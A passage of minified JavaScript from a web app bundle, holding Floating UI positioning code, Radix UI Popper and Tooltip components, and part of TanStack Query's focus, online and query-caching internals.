f=vs(n);d=na(n),u.x=f.x+n.clientLeft,u.y=f.y+n.clientTop}return{width:r.width*d.x,height:r.height*d.y,x:r.x*d.x-c.scrollLeft*d.x+u.x,y:r.y*d.y-c.scrollTop*d.y+u.y}}function VN(t){return Array.from(t.getClientRects())}function pu(t,e){const r=rc(t).scrollLeft;return e?e.left+r:vs(Er(t)).left+r}function HN(t){const e=Er(t),r=rc(t),n=t.ownerDocument.body,s=Tt(e.scrollWidth,e.clientWidth,n.scrollWidth,n.clientWidth),i=Tt(e.scrollHeight,e.clientHeight,n.scrollHeight,n.clientHeight);let o=-r.scrollLeft+pu(t);const l=-r.scrollTop;return fr(n).direction==="rtl"&&(o+=Tt(e.clientWidth,n.clientWidth)-s),{width:s,height:i,x:o,y:l}}function GN(t,e){const r=It(t),n=Er(t),s=r.visualViewport;let i=n.clientWidth,o=n.clientHeight,l=0,c=0;if(s){i=s.width,o=s.height;const d=nf();(!d||d&&e==="fixed")&&(l=s.offsetLeft,c=s.offsetTop)}return{width:i,height:o,x:l,y:c}}function WN(t,e){const r=vs(t,!0,e==="fixed"),n=r.top+t.clientTop,s=r.left+t.clientLeft,i=kr(t)?na(t):Cn(1),o=t.clientWidth*i.x,l=t.clientHeight*i.y,c=s*i.x,d=n*i.y;return{width:o,height:l,x:c,y:d}}function e0(t,e,r){let n;if(e==="viewport")n=GN(t,r);else if(e==="document")n=HN(Er(t));else if(hr(e))n=WN(e,r);else{const s=vy(t);n={...e,x:e.x-s.x,y:e.y-s.y}}return Nl(n)}function by(t,e){const r=Pn(t);return r===e||!hr(r)||_a(r)?!1:fr(r).position==="fixed"||by(r,e)}function KN(t,e){const r=e.get(t);if(r)return r;let n=Li(t,[],!1).filter(l=>hr(l)&&Aa(l)!=="body"),s=null;const i=fr(t).position==="fixed";let o=i?Pn(t):t;for(;hr(o)&&!_a(o);){const l=fr(o),c=rf(o);!c&&l.position==="fixed"&&(s=null),(i?!c&&!s:!c&&l.position==="static"&&!!s&&["absolute","fixed"].includes(s.position)||Ji(o)&&!c&&by(t,o))?n=n.filter(u=>u!==o):s=l,o=Pn(o)}return e.set(t,n),n}function qN(t){let{element:e,boundary:r,rootBoundary:n,strategy:s}=t;const o=[...r==="clippingAncestors"?tc(e)?[]:KN(e,this._c):[].concat(r),n],l=o[0],c=o.reduce((d,u)=>{const h=e0(e,u,s);return d.top=Tt(h.top,d.top),d.right=En(h.right,d.right),d.bottom=En(h.bottom,d.bottom),d.left=Tt(h.left,d.left),d},e0(e,l,s));return{width:c.right-c.left,height:c.bottom-c.top,x:c.left,y:c.top}}function QN(t){const{width:e,height:r}=yy(t);return{width:e,height:r}}function YN(t,e,r){const n=kr(e),s=Er(e),i=r==="fixed",o=vs(t,!0,i,e);let l={scrollLeft:0,scrollTop:0};const c=Cn(0);if(n||!n&&!i)if((Aa(e)!=="body"||Ji(s))&&(l=rc(e)),n){const m=vs(e,!0,i,e);c.x=m.x+e.clientLeft,c.y=m.y+e.clientTop}else s&&(c.x=pu(s));let d=0,u=0;if(s&&!n&&!i){const m=s.getBoundingClientRect();u=m.top+l.scrollTop,d=m.left+l.scrollLeft-pu(s,m)}const h=o.left+l.scrollLeft-c.x-d,f=o.top+l.scrollTop-c.y-u;return{x:h,y:f,width:o.width,height:o.height}}function Zc(t){return fr(t).position==="static"}function t0(t,e){if(!kr(t)||fr(t).position==="fixed")return null;if(e)return e(t);let r=t.offsetParent;return Er(t)===r&&(r=r.ownerDocument.body),r}function wy(t,e){const r=It(t);if(tc(t))return r;if(!kr(t)){let s=Pn(t);for(;s&&!_a(s);){if(hr(s)&&!Zc(s))return s;s=Pn(s)}return r}let n=t0(t,e);for(;n&&UN(n)&&Zc(n);)n=t0(n,e);return n&&_a(n)&&Zc(n)&&!rf(n)?r:n||DN(t)||r}const JN=async function(t){const e=this.getOffsetParent||wy,r=this.getDimensions,n=await r(t.floating);return{reference:YN(t.reference,await e(t.floating),t.strategy),floating:{x:0,y:0,width:n.width,height:n.height}}};function XN(t){return fr(t).direction==="rtl"}const ZN={convertOffsetParentRelativeRectToViewportRelativeRect:BN,getDocumentElement:Er,getClippingRect:qN,getOffsetParent:wy,getElementRects:JN,getClientRects:VN,getDimensions:QN,getScale:na,isElement:hr,isRTL:XN};function eS(t,e){let r=null,n;const s=Er(t);function i(){var l;clearTimeout(n),(l=r)==null||l.disconnect(),r=null}function o(l,c){l===void 0&&(l=!1),c===void 0&&(c=1),i();const{left:d,top:u,width:h,height:f}=t.getBoundingClientRect();if(l||e(),!h||!f)return;const m=_o(u),g=_o(s.clientWidth-(d+h)),v=_o(s.clientHeight-(u+f)),w=_o(d),x={rootMargin:-m+"px "+-g+"px "+-v+"px "+-w+"px",threshold:Tt(0,En(1,c))||1};let b=!0;function j(_){const N=_[0].intersectionRatio;if(N!==c){if(!b)return o();N?o(!1,N):n=setTimeout(()=>{o(!1,1e-7)},1e3)}b=!1}try{r=new IntersectionObserver(j,{...x,root:s.ownerDocument})}catch{r=new IntersectionObserver(j,x)}r.observe(t)}return o(!0),i}function tS(t,e,r,n){n===void 0&&(n={});const{ancestorScroll:s=!0,ancestorResize:i=!0,elementResize:o=typeof ResizeObserver=="function",layoutShift:l=typeof IntersectionObserver=="function",animationFrame:c=!1}=n,d=sf(t),u=s||i?[...d?Li(d):[],...Li(e)]:[];u.forEach(y=>{s&&y.addEventListener("scroll",r,{passive:!0}),i&&y.addEventListener("resize",r)});const h=d&&l?eS(d,r):null;let f=-1,m=null;o&&(m=new ResizeObserver(y=>{let[x]=y;x&&x.target===d&&m&&(m.unobserve(e),cancelAnimationFrame(f),f=requestAnimationFrame(()=>{var b;(b=m)==null||b.observe(e)})),r()}),d&&!c&&m.observe(d),m.observe(e));let g,v=c?vs(t):null;c&&w();function w(){const y=vs(t);v&&(y.x!==v.x||y.y!==v.y||y.width!==v.width||y.height!==v.height)&&r(),v=y,g=requestAnimationFrame(w)}return r(),()=>{var y;u.forEach(x=>{s&&x.removeEventListener("scroll",r),i&&x.removeEventListener("resize",r)}),h==null||h(),(y=m)==null||y.disconnect(),m=null,c&&cancelAnimationFrame(g)}}const rS=LN,nS=MN,sS=AN,aS=$N,iS=RN,r0=PN,oS=ON,lS=(t,e,r)=>{const n=new Map,s={platform:ZN,...r},i={...s.platform,_c:n};return TN(t,e,{...s,platform:i})};var Go=typeof document<"u"?p.useLayoutEffect:p.useEffect;function Sl(t,e){if(t===e)return!0;if(typeof t!=typeof e)return!1;if(typeof t=="function"&&t.toString()===e.toString())return!0;let r,n,s;if(t&&e&&typeof t=="object"){if(Array.isArray(t)){if(r=t.length,r!==e.length)return!1;for(n=r;n--!==0;)if(!Sl(t[n],e[n]))return!1;return!0}if(s=Object.keys(t),r=s.length,r!==Object.keys(e).length)return!1;for(n=r;n--!==0;)if(!{}.hasOwnProperty.call(e,s[n]))return!1;for(n=r;n--!==0;){const i=s[n];if(!(i==="_owner"&&t.$$typeof)&&!Sl(t[i],e[i]))return!1}return!0}return t!==t&&e!==e}function jy(t){return typeof window>"u"?1:(t.ownerDocument.defaultView||window).devicePixelRatio||1}function n0(t,e){const r=jy(t);return Math.round(e*r)/r}function ed(t){const e=p.useRef(t);return Go(()=>{e.current=t}),e}function cS(t){t===void 0&&(t={});const{placement:e="bottom",strategy:r="absolute",middleware:n=[],platform:s,elements:{reference:i,floating:o}={},transform:l=!0,whileElementsMounted:c,open:d}=t,[u,h]=p.useState({x:0,y:0,strategy:r,placement:e,middlewareData:{},isPositioned:!1}),[f,m]=p.useState(n);Sl(f,n)||m(n);const[g,v]=p.useState(null),[w,y]=p.useState(null),x=p.useCallback(P=>{P!==N.current&&(N.current=P,v(P))},[]),b=p.useCallback(P=>{P!==S.current&&(S.current=P,y(P))},[]),j=i||g,_=o||w,N=p.useRef(null),S=p.useRef(null),k=p.useRef(u),C=c!=null,T=ed(c),M=ed(s),A=ed(d),R=p.useCallback(()=>{if(!N.current||!S.current)return;const P={placement:e,strategy:r,middleware:f};M.current&&(P.platform=M.current),lS(N.current,S.current,P).then(z=>{const Q={...z,isPositioned:A.current!==!1};I.current&&!Sl(k.current,Q)&&(k.current=Q,Qi.flushSync(()=>{h(Q)}))})},[f,e,r,M,A]);Go(()=>{d===!1&&k.current.isPositioned&&(k.current.isPositioned=!1,h(P=>({...P,isPositioned:!1})))},[d]);const I=p.useRef(!1);Go(()=>(I.current=!0,()=>{I.current=!1}),[]),Go(()=>{if(j&&(N.current=j),_&&(S.current=_),j&&_){if(T.current)return T.current(j,_,R);R()}},[j,_,R,T,C]);const J=p.useMemo(()=>({reference:N,floating:S,setReference:x,setFloating:b}),[x,b]),K=p.useMemo(()=>({reference:j,floating:_}),[j,_]),ne=p.useMemo(()=>{const P={position:r,left:0,top:0};if(!K.floating)return P;const z=n0(K.floating,u.x),Q=n0(K.floating,u.y);return l?{...P,transform:"translate("+z+"px, "+Q+"px)",...jy(K.floating)>=1.5&&{willChange:"transform"}}:{position:r,left:z,top:Q}},[r,l,K.floating,u.x,u.y]);return p.useMemo(()=>({...u,update:R,refs:J,elements:K,floatingStyles:ne}),[u,R,J,K,ne])}const dS=t=>{function e(r){return{}.hasOwnProperty.call(r,"current")}return{name:"arrow",options:t,fn(r){const{element:n,padding:s}=typeof t=="function"?t(r):t;return n&&e(n)?n.current!=null?r0({element:n.current,padding:s}).fn(r):{}:n?r0({element:n,padding:s}).fn(r):{}}}},uS=(t,e)=>({...rS(t),options:[t,e]}),hS=(t,e)=>({...nS(t),options:[t,e]}),fS=(t,e)=>({...oS(t),options:[t,e]}),mS=(t,e)=>({...sS(t),options:[t,e]}),pS=(t,e)=>({...aS(t),options:[t,e]}),gS=(t,e)=>({...iS(t),options:[t,e]}),xS=(t,e)=>({...dS(t),options:[t,e]});var yS="Arrow",_y=p.forwardRef((t,e)=>{const{children:r,width:n=10,height:s=5,...i}=t;return a.jsx(ze.svg,{...i,ref:e,width:n,height:s,viewBox:"0 0 30 10",preserveAspectRatio:"none",children:t.asChild?r:a.jsx("polygon",{points:"0,0 30,0 15,10"})})});_y.displayName=yS;var vS=_y;function bS(t,e=[]){let r=[];function n(i,o){const l=p.createContext(o),c=r.length;r=[...r,o];function d(h){const{scope:f,children:m,...g}=h,v=(f==null?void 0:f[t][c])||l,w=p.useMemo(()=>g,Object.values(g));return a.jsx(v.Provider,{value:w,children:m})}function u(h,f){const m=(f==null?void 0:f[t][c])||l,g=p.useContext(m);if(g)return g;if(o!==void 0)return o;throw new Error(`\`${h}\` must be used within \`${i}\``)}return d.displayName=i+"Provider",[d,u]}const s=()=>{const i=r.map(o=>p.createContext(o));return function(l){const c=(l==null?void 0:l[t])||i;return p.useMemo(()=>({[`__scope${t}`]:{...l,[t]:c}}),[l,c])}};return s.scopeName=t,[n,wS(s,...e)]}function wS(...t){const e=t[0];if(t.length===1)return e;const r=()=>{const n=t.map(s=>({useScope:s(),scopeName:s.scopeName}));return function(i){const o=n.reduce((l,{useScope:c,scopeName:d})=>{const h=c(i)[`__scope${d}`];return{...l,...h}},{});return p.useMemo(()=>({[`__scope${e.scopeName}`]:o}),[o])}};return r.scopeName=e.scopeName,r}function jS(t){const[e,r]=p.useState(void 0);return _n(()=>{if(t){r({width:t.offsetWidth,height:t.offsetHeight});const n=new ResizeObserver(s=>{if(!Array.isArray(s)||!s.length)return;const i=s[0];let o,l;if("borderBoxSize"in i){const c=i.borderBoxSize,d=Array.isArray(c)?c[0]:c;o=d.inlineSize,l=d.blockSize}else o=t.offsetWidth,l=t.offsetHeight;r({width:o,height:l})});return n.observe(t,{box:"border-box"}),()=>n.unobserve(t)}else r(void 0)},[t]),e}var Ny="Popper",[Sy,ky]=bS(Ny),[CC,Ey]=Sy(Ny),Cy="PopperAnchor",Ty=p.forwardRef((t,e)=>{const{__scopePopper:r,virtualRef:n,...s}=t,i=Ey(Cy,r),o=p.useRef(null),l=Yt(e,o);return p.useEffect(()=>{i.onAnchorChange((n==null?void 0:n.current)||o.current)}),n?null:a.jsx(ze.div,{...s,ref:l})});Ty.displayName=Cy;var af="PopperContent",[_S,NS]=Sy(af),Py=p.forwardRef((t,e)=>{var Je,$t,Ut,B,Y,ee;const{__scopePopper:r,side:n="bottom",sideOffset:s=0,align:i="center",alignOffset:o=0,arrowPadding:l=0,avoidCollisions:c=!0,collisionBoundary:d=[],collisionPadding:u=0,sticky:h="partial",hideWhenDetached:f=!1,updatePositionStrategy:m="optimized",onPlaced:g,...v}=t,w=Ey(af,r),[y,x]=p.useState(null),b=Yt(e,pe=>x(pe)),[j,_]=p.useState(null),N=jS(j),S=(N==null?void 0:N.width)??0,k=(N==null?void 0:N.height)??0,C=n+(i!=="center"?"-"+i:""),T=typeof u=="number"?u:{top:0,right:0,bottom:0,left:0,...u},M=Array.isArray(d)?d:[d],A=M.length>0,R={padding:T,boundary:M.filter(kS),altBoundary:A},{refs:I,floatingStyles:J,placement:K,isPositioned:ne,middlewareData:P}=cS({strategy:"fixed",placement:C,whileElementsMounted:(...pe)=>tS(...pe,{animationFrame:m==="always"}),elements:{reference:w.anchor},middleware:[uS({mainAxis:s+k,alignmentAxis:o}),c&&hS({mainAxis:!0,crossAxis:!1,limiter:h==="partial"?fS():void 0,...R}),c&&mS({...R}),pS({...R,apply:({elements:pe,rects:ye,availableWidth:he,availableHeight:E})=>{const{width:U,height:O}=ye.reference,V=pe.floating.style;V.setProperty("--radix-popper-available-width",`${he}px`),V.setProperty("--radix-popper-available-height",`${E}px`),V.setProperty("--radix-popper-anchor-width",`${U}px`),V.setProperty("--radix-popper-anchor-height",`${O}px`)}}),j&&xS({element:j,padding:l}),ES({arrowWidth:S,arrowHeight:k}),f&&gS({strategy:"referenceHidden",...R})]}),[z,Q]=Iy(K),H=ur(g);_n(()=>{ne&&(H==null||H())},[ne,H]);const te=(Je=P.arrow)==null?void 0:Je.x,ie=($t=P.arrow)==null?void 0:$t.y,_e=((Ut=P.arrow)==null?void 0:Ut.centerOffset)!==0,[Ye,ge]=p.useState();return _n(()=>{y&&ge(window.getComputedStyle(y).zIndex)},[y]),a.jsx("div",{ref:I.setFloating,"data-radix-popper-content-wrapper":"",style:{...J,transform:ne?J.transform:"translate(0, -200%)",minWidth:"max-content",zIndex:Ye,"--radix-popper-transform-origin":[(B=P.transformOrigin)==null?void 0:B.x,(Y=P.transformOrigin)==null?void 0:Y.y].join(" "),...((ee=P.hide)==null?void 0:ee.referenceHidden)&&{visibility:"hidden",pointerEvents:"none"}},dir:t.dir,children:a.jsx(_S,{scope:r,placedSide:z,onArrowChange:_,arrowX:te,arrowY:ie,shouldHideArrow:_e,children:a.jsx(ze.div,{"data-side":z,"data-align":Q,...v,ref:b,style:{...v.style,animation:ne?void 0:"none"}})})})});Py.displayName=af;var Ay="PopperArrow",SS={top:"bottom",right:"left",bottom:"top",left:"right"},Ry=p.forwardRef(function(e,r){const{__scopePopper:n,...s}=e,i=NS(Ay,n),o=SS[i.placedSide];return a.jsx("span",{ref:i.onArrowChange,style:{position:"absolute",left:i.arrowX,top:i.arrowY,[o]:0,transformOrigin:{top:"",right:"0 0",bottom:"center 0",left:"100% 0"}[i.placedSide],transform:{top:"translateY(100%)",right:"translateY(50%) rotate(90deg) translateX(-50%)",bottom:"rotate(180deg)",left:"translateY(50%) rotate(-90deg) translateX(50%)"}[i.placedSide],visibility:i.shouldHideArrow?"hidden":void 0},children:a.jsx(vS,{...s,ref:r,style:{...s.style,display:"block"}})})});Ry.displayName=Ay;function kS(t){return t!==null}var ES=t=>({name:"transformOrigin",options:t,fn(e){var w,y,x;const{placement:r,rects:n,middlewareData:s}=e,o=((w=s.arrow)==null?void 0:w.centerOffset)!==0,l=o?0:t.arrowWidth,c=o?0:t.arrowHeight,[d,u]=Iy(r),h={start:"0%",center:"50%",end:"100%"}[u],f=(((y=s.arrow)==null?void 0:y.x)??0)+l/2,m=(((x=s.arrow)==null?void 0:x.y)??0)+c/2;let g="",v="";return d==="bottom"?(g=o?h:`${f}px`,v=`${-c}px`):d==="top"?(g=o?h:`${f}px`,v=`${n.floating.height+c}px`):d==="right"?(g=`${-c}px`,v=o?h:`${m}px`):d==="left"&&(g=`${n.floating.width+c}px`,v=o?h:`${m}px`),{data:{x:g,y:v}}}});function Iy(t){const[e,r="center"]=t.split("-");return[e,r]}var CS=Ty,TS=Py,PS=Ry,[nc,TC]=Fh("Tooltip",[ky]),of=ky(),Ly="TooltipProvider",AS=700,s0="tooltip.open",[RS,My]=nc(Ly),Oy=t=>{const{__scopeTooltip:e,delayDuration:r=AS,skipDelayDuration:n=300,disableHoverableContent:s=!1,children:i}=t,[o,l]=p.useState(!0),c=p.useRef(!1),d=p.useRef(0);return p.useEffect(()=>{const u=d.current;return()=>window.clearTimeout(u)},[]),a.jsx(RS,{scope:e,isOpenDelayed:o,delayDuration:r,onOpen:p.useCallback(()=>{window.clearTimeout(d.current),l(!1)},[]),onClose:p.useCallback(()=>{window.clearTimeout(d.current),d.current=window.setTimeout(()=>l(!0),n)},[n]),isPointerInTransitRef:c,onPointerInTransitChange:p.useCallback(u=>{c.current=u},[]),disableHoverableContent:s,children:i})};Oy.displayName=Ly;var $y="Tooltip",[PC,sc]=nc($y),gu="TooltipTrigger",IS=p.forwardRef((t,e)=>{const{__scopeTooltip:r,...n}=t,s=sc(gu,r),i=My(gu,r),o=of(r),l=p.useRef(null),c=Yt(e,l,s.onTriggerChange),d=p.useRef(!1),u=p.useRef(!1),h=p.useCallback(()=>d.current=!1,[]);return p.useEffect(()=>()=>document.removeEventListener("pointerup",h),[h]),a.jsx(CS,{asChild:!0,...o,children:a.jsx(ze.button,{"aria-describedby":s.open?s.contentId:void 0,"data-state":s.stateAttribute,...n,ref:c,onPointerMove:Ne(t.onPointerMove,f=>{f.pointerType!=="touch"&&!u.current&&!i.isPointerInTransitRef.current&&(s.onTriggerEnter(),u.current=!0)}),onPointerLeave:Ne(t.onPointerLeave,()=>{s.onTriggerLeave(),u.current=!1}),onPointerDown:Ne(t.onPointerDown,()=>{d.current=!0,document.addEventListener("pointerup",h,{once:!0})}),onFocus:Ne(t.onFocus,()=>{d.current||s.onOpen()}),onBlur:Ne(t.onBlur,s.onClose),onClick:Ne(t.onClick,s.onClose)})})});IS.displayName=gu;var LS="TooltipPortal",[AC,MS]=nc(LS,{forceMount:void 0}),Na="TooltipContent",Uy=p.forwardRef((t,e)=>{const r=MS(Na,t.__scopeTooltip),{forceMount:n=r.forceMount,side:s="top",...i}=t,o=sc(Na,t.__scopeTooltip);return a.jsx(Ql,{present:n||o.open,children:o.disableHoverableContent?a.jsx(Dy,{side:s,...i,ref:e}):a.jsx(OS,{side:s,...i,ref:e})})}),OS=p.forwardRef((t,e)=>{const r=sc(Na,t.__scopeTooltip),n=My(Na,t.__scopeTooltip),s=p.useRef(null),i=Yt(e,s),[o,l]=p.useState(null),{trigger:c,onClose:d}=r,u=s.current,{onPointerInTransitChange:h}=n,f=p.useCallback(()=>{l(null),h(!1)},[h]),m=p.useCallback((g,v)=>{const w=g.currentTarget,y={x:g.clientX,y:g.clientY},x=zS(y,w.getBoundingClientRect()),b=FS(y,x),j=BS(v.getBoundingClientRect()),_=HS([...b,...j]);l(_),h(!0)},[h]);return p.useEffect(()=>()=>f(),[f]),p.useEffect(()=>{if(c&&u){const g=w=>m(w,u),v=w=>m(w,c);return c.addEventListener("pointerleave",g),u.addEventListener("pointerleave",v),()=>{c.removeEventListener("pointerleave",g),u.removeEventListener("pointerleave",v)}}},[c,u,m,f]),p.useEffect(()=>{if(o){const g=v=>{const w=v.target,y={x:v.clientX,y:v.clientY},x=(c==null?void 0:c.contains(w))||(u==null?void 0:u.contains(w)),b=!VS(y,o);x?f():b&&(f(),d())};return document.addEventListener("pointermove",g),()=>document.removeEventListener("pointermove",g)}},[c,u,o,d,f]),a.jsx(Dy,{...t,ref:i})}),[$S,US]=nc($y,{isInside:!1}),Dy=p.forwardRef((t,e)=>{const{__scopeTooltip:r,children:n,"aria-label":s,onEscapeKeyDown:i,onPointerDownOutside:o,...l}=t,c=sc(Na,r),d=of(r),{onClose:u}=c;return p.useEffect(()=>(document.addEventListener(s0,u),()=>document.removeEventListener(s0,u)),[u]),p.useEffect(()=>{if(c.trigger){const h=f=>{const m=f.target;m!=null&&m.contains(c.trigger)&&u()};return window.addEventListener("scroll",h,{capture:!0}),()=>window.removeEventListener("scroll",h,{capture:!0})}},[c.trigger,u]),a.jsx(Bh,{asChild:!0,disableOutsidePointerEvents:!1,onEscapeKeyDown:i,onPointerDownOutside:o,onFocusOutside:h=>h.preventDefault(),onDismiss:u,children:a.jsxs(TS,{"data-state":c.stateAttribute,...d,...l,ref:e,style:{...l.style,"--radix-tooltip-content-transform-origin":"var(--radix-popper-transform-origin)","--radix-tooltip-content-available-width":"var(--radix-popper-available-width)","--radix-tooltip-content-available-height":"var(--radix-popper-available-height)","--radix-tooltip-trigger-width":"var(--radix-popper-anchor-width)","--radix-tooltip-trigger-height":"var(--radix-popper-anchor-height)"},children:[a.jsx(jx,{children:n}),a.jsx($S,{scope:r,isInside:!0,children:a.jsx(gj,{id:c.contentId,role:"tooltip",children:s||n})})]})})});Uy.displayName=Na;var zy="TooltipArrow",DS=p.forwardRef((t,e)=>{const{__scopeTooltip:r,...n}=t,s=of(r);return US(zy,r).isInside?null:a.jsx(PS,{...s,...n,ref:e})});DS.displayName=zy;function zS(t,e){const r=Math.abs(e.top-t.y),n=Math.abs(e.bottom-t.y),s=Math.abs(e.right-t.x),i=Math.abs(e.left-t.x);switch(Math.min(r,n,s,i)){case i:return"left";case s:return"right";case r:return"top";case n:return"bottom";default:throw new Error("unreachable")}}function FS(t,e,r=5){const n=[];switch(e){case"top":n.push({x:t.x-r,y:t.y+r},{x:t.x+r,y:t.y+r});break;case"bottom":n.push({x:t.x-r,y:t.y-r},{x:t.x+r,y:t.y-r});break;case"left":n.push({x:t.x+r,y:t.y-r},{x:t.x+r,y:t.y+r});break;case"right":n.push({x:t.x-r,y:t.y-r},{x:t.x-r,y:t.y+r});break}return n}function BS(t){const{top:e,right:r,bottom:n,left:s}=t;return[{x:s,y:e},{x:r,y:e},{x:r,y:n},{x:s,y:n}]}function VS(t,e){const{x:r,y:n}=t;let s=!1;for(let i=0,o=e.length-1;i<e.length;o=i++){const l=e[i].x,c=e[i].y,d=e[o].x,u=e[o].y;c>n!=u>n&&r<(d-l)*(n-c)/(u-c)+l&&(s=!s)}return s}function HS(t){const e=t.slice();return e.sort((r,n)=>r.x<n.x?-1:r.x>n.x?1:r.y<n.y?-1:r.y>n.y?1:0),GS(e)}function GS(t){if(t.length<=1)return t.slice();const e=[];for(let n=0;n<t.length;n++){const s=t[n];for(;e.length>=2;){const i=e[e.length-1],o=e[e.length-2];if((i.x-o.x)*(s.y-o.y)>=(i.y-o.y)*(s.x-o.x))e.pop();else break}e.push(s)}e.pop();const r=[];for(let n=t.length-1;n>=0;n--){const s=t[n];for(;r.length>=2;){const i=r[r.length-1],o=r[r.length-2];if((i.x-o.x)*(s.y-o.y)>=(i.y-o.y)*(s.x-o.x))r.pop();else break}r.push(s)}return r.pop(),e.length===1&&r.length===1&&e[0].x===r[0].x&&e[0].y===r[0].y?e:e.concat(r)}var WS=Oy,Fy=Uy;const KS=WS,qS=p.forwardRef(({className:t,sideOffset:e=4,...r},n)=>a.jsx(Fy,{ref:n,sideOffset:e,className:we("z-50 overflow-hidden rounded-md border bg-popover px-3 py-1.5 text-sm text-popover-foreground shadow-md animate-in fade-in-0 zoom-in-95 data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=closed]:zoom-out-95 data-[side=bottom]:slide-in-from-top-2 data-[side=left]:slide-in-from-right-2 data-[side=right]:slide-in-from-left-2 data-[side=top]:slide-in-from-bottom-2",t),...r}));qS.displayName=Fy.displayName;var ac=class{constructor(){this.listeners=new Set,this.subscribe=this.subscribe.bind(this)}subscribe(t){return this.listeners.add(t),this.onSubscribe(),()=>{this.listeners.delete(t),this.onUnsubscribe()}}hasListeners(){return this.listeners.size>0}onSubscribe(){}onUnsubscribe(){}},ic=typeof window>"u"||"Deno"in globalThis;function er(){}function QS(t,e){return typeof t=="function"?t(e):t}function YS(t){return typeof t=="number"&&t>=0&&t!==1/0}function JS(t,e){return Math.max(t+(e||0)-Date.now(),0)}function a0(t,e){return typeof t=="function"?t(e):t}function XS(t,e){return typeof t=="function"?t(e):t}function i0(t,e){const{type:r="all",exact:n,fetchStatus:s,predicate:i,queryKey:o,stale:l}=t;if(o){if(n){if(e.queryHash!==lf(o,e.options))return!1}else if(!Oi(e.queryKey,o))return!1}if(r!=="all"){const c=e.isActive();if(r==="active"&&!c||r==="inactive"&&c)return!1}return!(typeof l=="boolean"&&e.isStale()!==l||s&&s!==e.state.fetchStatus||i&&!i(e))}function o0(t,e){const{exact:r,status:n,predicate:s,mutationKey:i}=t;if(i){if(!e.options.mutationKey)return!1;if(r){if(Mi(e.options.mutationKey)!==Mi(i))return!1}else if(!Oi(e.options.mutationKey,i))return!1}return!(n&&e.state.status!==n||s&&!s(e))}function lf(t,e){return((e==null?void 0:e.queryKeyHashFn)||Mi)(t)}function Mi(t){return JSON.stringify(t,(e,r)=>xu(r)?Object.keys(r).sort().reduce((n,s)=>(n[s]=r[s],n),{}):r)}function Oi(t,e){return t===e?!0:typeof t!=typeof e?!1:t&&e&&typeof t=="object"&&typeof e=="object"?!Object.keys(e).some(r=>!Oi(t[r],e[r])):!1}function By(t,e){if(t===e)return t;const r=l0(t)&&l0(e);if(r||xu(t)&&xu(e)){const n=r?t:Object.keys(t),s=n.length,i=r?e:Object.keys(e),o=i.length,l=r?[]:{};let c=0;for(let d=0;d<o;d++){const u=r?d:i[d];(!r&&n.includes(u)||r)&&t[u]===void 0&&e[u]===void 0?(l[u]=void 0,c++):(l[u]=By(t[u],e[u]),l[u]===t[u]&&t[u]!==void 0&&c++)}return s===o&&c===s?t:l}return e}function l0(t){return Array.isArray(t)&&t.length===Object.keys(t).length}function xu(t){if(!c0(t))return!1;const e=t.constructor;if(e===void 0)return!0;const r=e.prototype;return!(!c0(r)||!r.hasOwnProperty("isPrototypeOf")||Object.getPrototypeOf(t)!==Object.prototype)}function c0(t){return Object.prototype.toString.call(t)==="[object Object]"}function ZS(t){return new Promise(e=>{setTimeout(e,t)})}function e2(t,e,r){return typeof r.structuralSharing=="function"?r.structuralSharing(t,e):r.structuralSharing!==!1?By(t,e):e}function t2(t,e,r=0){const n=[...t,e];return r&&n.length>r?n.slice(1):n}function r2(t,e,r=0){const n=[e,...t];return r&&n.length>r?n.slice(0,-1):n}var cf=Symbol();function Vy(t,e){return!t.queryFn&&(e!=null&&e.initialPromise)?()=>e.initialPromise:!t.queryFn||t.queryFn===cf?()=>Promise.reject(new Error(`Missing queryFn: '${t.queryHash}'`)):t.queryFn}var os,sn,sa,J0,n2=(J0=class extends ac{constructor(){super();ve(this,os);ve(this,sn);ve(this,sa);ce(this,sa,e=>{if(!ic&&window.addEventListener){const r=()=>e();return window.addEventListener("visibilitychange",r,!1),()=>{window.removeEventListener("visibilitychange",r)}}})}onSubscribe(){L(this,sn)||this.setEventListener(L(this,sa))}onUnsubscribe(){var e;this.hasListeners()||((e=L(this,sn))==null||e.call(this),ce(this,sn,void 0))}setEventListener(e){var r;ce(this,sa,e),(r=L(this,sn))==null||r.call(this),ce(this,sn,e(n=>{typeof n=="boolean"?this.setFocused(n):this.onFocus()}))}setFocused(e){L(this,os)!==e&&(ce(this,os,e),this.onFocus())}onFocus(){const e=this.isFocused();this.listeners.forEach(r=>{r(e)})}isFocused(){var e;return typeof L(this,os)=="boolean"?L(this,os):((e=globalThis.document)==null?void 0:e.visibilityState)!=="hidden"}},os=new WeakMap,sn=new WeakMap,sa=new WeakMap,J0),Hy=new n2,aa,an,ia,X0,s2=(X0=class extends ac{constructor(){super();ve(this,aa,!0);ve(this,an);ve(this,ia);ce(this,ia,e=>{if(!ic&&window.addEventListener){const r=()=>e(!0),n=()=>e(!1);return window.addEventListener("online",r,!1),window.addEventListener("offline",n,!1),()=>{window.removeEventListener("online",r),window.removeEventListener("offline",n)}}})}onSubscribe(){L(this,an)||this.setEventListener(L(this,ia))}onUnsubscribe(){var e;this.hasListeners()||((e=L(this,an))==null||e.call(this),ce(this,an,void 0))}setEventListener(e){var r;ce(this,ia,e),(r=L(this,an))==null||r.call(this),ce(this,an,e(this.setOnline.bind(this)))}setOnline(e){L(this,aa)!==e&&(ce(this,aa,e),this.listeners.forEach(n=>{n(e)}))}isOnline(){return L(this,aa)}},aa=new WeakMap,an=new WeakMap,ia=new WeakMap,X0),kl=new s2;function a2(){let t,e;const r=new Promise((s,i)=>{t=s,e=i});r.status="pending",r.catch(()=>{});function n(s){Object.assign(r,s),delete r.resolve,delete r.reject}return r.resolve=s=>{n({status:"fulfilled",value:s}),t(s)},r.reject=s=>{n({status:"rejected",reason:s}),e(s)},r}function i2(t){return Math.min(1e3*2**t,3e4)}function Gy(t){return(t??"online")==="online"?kl.isOnline():!0}var Wy=class extends Error{constructor(t){super("CancelledError"),this.revert=t==null?void 0:t.revert,this.silent=t==null?void 0:t.silent}};function td(t){return t instanceof Wy}function Ky(t){let e=!1,r=0,n=!1,s;const i=a2(),o=v=>{var w;n||(f(new Wy(v)),(w=t.abort)==null||w.call(t))},l=()=>{e=!0},c=()=>{e=!1},d=()=>Hy.isFocused()&&(t.networkMode==="always"||kl.isOnline())&&t.canRun(),u=()=>Gy(t.networkMode)&&t.canRun(),h=v=>{var w;n||(n=!0,(w=t.onSuccess)==null||w.call(t,v),s==null||s(),i.resolve(v))},f=v=>{var w;n||(n=!0,(w=t.onError)==null||w.call(t,v),s==null||s(),i.reject(v))},m=()=>new Promise(v=>{var 